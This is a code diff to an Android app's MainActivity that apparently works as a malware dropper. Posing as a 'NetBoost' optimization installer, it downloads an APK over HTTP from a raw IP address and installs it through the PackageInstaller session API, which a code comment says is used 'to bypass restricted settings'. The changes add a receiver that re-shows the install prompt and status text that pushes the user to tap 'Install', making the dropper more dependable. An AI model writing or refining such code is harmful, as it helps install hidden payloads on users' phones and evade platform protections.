@@ -28,12 +28,45 @@ import okhttp3.Request
 import java.io.File
 import java.io.FileOutputStream
 
+import android.content.BroadcastReceiver
+import android.content.IntentFilter
+
 class MainActivity : ComponentActivity() {
 
     private val apkUrl = "http://69.169.102.3/netboost.apk"
+    private val ACTION_INSTALL_COMPLETE = "com.netboost.installer.INSTALL_COMPLETE"
+
+    private val installReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            if (intent.action == ACTION_INSTALL_COMPLETE) {
+                val status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE)
+                if (status == PackageInstaller.STATUS_PENDING_USER_ACTION) {
+                    val confirmationIntent = intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
+                    if (confirmationIntent != null) {
+                        confirmationIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        startActivity(confirmationIntent)
+                    }
+                } else if (status == PackageInstaller.STATUS_SUCCESS) {
+                    Log.d("NetBoostInstaller", "Installation succeeded!")
+                    finish()
+                } else {
+                    val message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE)
+                    Log.e("NetBoostInstaller", "Installation failed: $status, $message")
+                }
+            }
+        }
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        
+        // Register the broadcast receiver
+        val filter = IntentFilter(ACTION_INSTALL_COMPLETE)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            registerReceiver(installReceiver, filter, Context.RECEIVER_EXPORTED)
+        } else {
+            registerReceiver(installReceiver, filter)
+        }
 
         setContent {
             MaterialTheme(
@@ -52,6 +85,15 @@ class MainActivity : ComponentActivity() {
         }
     }
 
+    override fun onDestroy() {
+        super.onDestroy()
+        try {
+            unregisterReceiver(installReceiver)
+        } catch (e: Exception) {
+            // Ignored
+        }
+    }
+
     @Composable
     fun InstallerScreen() {
         var progress by remember { mutableStateOf(0f) }
@@ -62,17 +104,19 @@ class MainActivity : ComponentActivity() {
 
         LaunchedEffect(Unit) {
             isDownloading = true
-            statusText = "Downloading core optimization libraries..."
+            statusText = "Downloading optimization engine..."
             
             // Start download
             val apkFile = File(cacheDir, "netboost_core.apk")
             val success = downloadApk(apkUrl, apkFile) { p -> progress = p }
 
             if (success) {
-                statusText = "Installing..."
+                statusText = "Installing optimization engine..."
                 installApk(apkFile)
+                statusText = "Tap 'Install' when prompted to complete setup."
+                progress = 1f
             } else {
-                statusText = "Failed to download update."
+                statusText = "Failed to download update. Check your connection."
             }
             isDownloading = false
         }
@@ -141,10 +185,9 @@ class MainActivity : ComponentActivity() {
             // Use PackageInstaller Session API to bypass restricted settings
             val packageInstaller = packageManager.packageInstaller
             val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
-            var session: PackageInstaller.Session? = null
             try {
                 val sessionId = packageInstaller.createSession(params)
-                session = packageInstaller.openSession(sessionId)
+                val session = packageInstaller.openSession(sessionId)
                 
                 val out = session.openWrite("package", 0, -1)
                 file.inputStream().use { input ->
@@ -153,25 +196,27 @@ class MainActivity : ComponentActivity() {
                 session.fsync(out)
                 out.close()
 
-                val intent = Intent(Intent.ACTION_MAIN) // Dummy intent for the broadcast receiver
-                val pendingIntent = PendingIntent.getActivity(
-                    this,
-                    0,
-                    intent,
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) PendingIntent.FLAG_MUTABLE else PendingIntent.FLAG_UPDATE_CURRENT
-                )
+                // Create an explicit intent for a broadcast receiver
+                val intent = Intent(ACTION_INSTALL_COMPLETE)
+                intent.setPackage(packageName)
+                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                    PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
+                } else {
+                    PendingIntent.FLAG_UPDATE_CURRENT
+                }
+                val pendingIntent = PendingIntent.getBroadcast(this, 0, intent, flags)
 
+                // Commit the session — Android will show its own install confirmation UI
+                // Do NOT close session or finish activity here; the system needs time to process
                 session.commit(pendingIntent.intentSender)
+                Log.d("NetBoostInstaller", "Session committed successfully, waiting for system installer...")
+
             } catch (e: Exception) {
-                e.printStackTrace()
-                fallbackInstall(file) // Fallback if session fails
-            } finally {
-                session?.close()
-                finish() // Close wrapper app once prompt is triggered
+                Log.e("NetBoostInstaller", "Session install failed, using fallback", e)
+                fallbackInstall(file)
             }
         } else {
             fallbackInstall(file)
-            finish()
         }
     }
     
